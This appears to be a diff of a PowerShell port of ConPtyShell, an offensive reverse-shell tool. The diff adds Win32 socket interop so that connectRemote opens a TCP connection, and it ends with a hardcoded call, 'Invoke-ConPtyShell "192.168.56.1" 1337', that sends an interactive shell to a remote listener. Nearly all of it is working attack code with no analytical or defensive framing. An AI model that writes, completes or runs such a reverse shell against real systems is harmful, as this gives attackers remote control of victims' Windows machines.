@@ -838,6 +838,13 @@ $global:WSAPROTOCOL_INFO_TYPE = struct $Mod WSAPROTOCOL_INFO @{
     szProtocol =        field 19 String -MarshalAs @('ByValTStr', 256)
 }
 
+$global:SOCKADDR_IN = struct $Mod SOCKADDR_IN @{
+    sin_family = field 0 Int16
+    sin_port = field 1 Int16
+    sin_addr = field 2 UInt32
+    sin_zero = field 3 Int64
+}
+
 $FunctionDefinitions = @(
     (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
     (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
@@ -853,10 +860,11 @@ $FunctionDefinitions = @(
         [UInt32], # Group
         [Int32]  # Flags
     )  -Charset Ansi -SetLastError),
-    # private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
+    (func ws2_32 connect ([Int32])  @([IntPtr], $global:SOCKADDR_IN.MakeByRefType(), [Int32])),
+    (func ws2_32 htons   ([UInt16]) @([UInt16]) -SetLastError),
+    (func ws2_32 inet_addr ([UInt32]) @([String]) -Charset Ansi -SetLastError),
     (func ws2_32 WSAGetLastError ([Int32])),
     (func ws2_32 WSAStartup ([Int32]) @([Int16], $global:WSAData_TYPE.MakeByRefType()))
-#    (func ws2_32 WSAStartup ([Int32]) @([Int16], [IntPtr]))# $global:WSAData.MakeByRefType()))
 )
 
 $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
@@ -874,7 +882,7 @@ class ConPtyShellException : System.Exception {
 
 
 class ConPtyShell {
-    hidden static [int]   $BUFFER_SIZE_PIPE  = 0x100000
+    hidden static [int]    $BUFFER_SIZE_PIPE = 0x100000
     hidden static [UInt32] $GENERIC_READ = 2147483648
     hidden static [UInt32] $GENERIC_WRITE    = 0x40000000
     hidden static [UInt32] $FILE_SHARE_READ  = 0x00000001
@@ -889,7 +897,6 @@ class ConPtyShell {
     $ProccessInformation = $global:ProccessInformation
 
     hidden static [void] InitWSAThread() {
-        Write-Host "plop"
         $data = New-Object -TypeName "WSAData"
 
         if ($global:ws2_32::WSAStartup(2 -shl 8 -bor 2, [ref]$data) -ne 0) {
@@ -899,15 +906,41 @@ class ConPtyShell {
     }
 
     hidden static [IntPtr] connectRemote([string] $remoteIp, [UInt32] $remotePort) {
-        [int] $port = 0
+        $ws2_32 = $global:ws2_32
+
+        [int] $port = $remotePort
         [int] $error = 0
         [string] $host = $remoteIp
 
         [IntPtr] $socket = [IntPtr]::Zero
+        $socket = $ws2_32::WSASocket(2, 1, 0, [IntPtr]::Zero, 0, 0x01)
+
+        $sockinfo = New-Object -TypeName "SOCKADDR_IN"
+        $sockinfo.sin_family = 2
+        $sockinfo.sin_addr = $ws2_32::inet_addr($host)
+        [Int16] $hport = [Int16] $ws2_32::htons($port)
+        $sockinfo.sin_port = $hport
+        $sockinfo.sin_zero = 0
 
 
+        $size = $global:SOCKADDR_IN::GetSize()
+        Write-Host "size: $size" 
 
-        return 0x42
+        $size_family = [Runtime.InteropServices.Marshal]::SizeOf($sockinfo.sin_family)
+        Write-Host "sin_family: $size_family" 
+        $size_addr = [Runtime.InteropServices.Marshal]::SizeOf($sockinfo.sin_addr)
+        Write-Host "sin_addr: $size_addr" 
+        $size_port = [Runtime.InteropServices.Marshal]::SizeOf($sockinfo.sin_port)
+        Write-Host "sin_port: $size_port" 
+        $size_zero = [Runtime.InteropServices.Marshal]::SizeOf($sockinfo.sin_zero)
+        Write-Host "sin_zero: $size_zero" 
+
+        if ($ws2_32::connect($socket, [ref]$sockinfo, $size) -ne 0) {
+            $error_code = $global:ws2_32::WSAGetLastError()
+            throw [ConPtyShellException] "WSAConnect failed with error code: $error_code"
+        }
+
+        return $socket
     }
 
     hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
@@ -1254,4 +1287,4 @@ function Invoke-ConPtyShell
     Write-Output $output
 }
 
-Invoke-ConPtyShell 10.10.10.14 1337
+Invoke-ConPtyShell "192.168.56.1" 1337
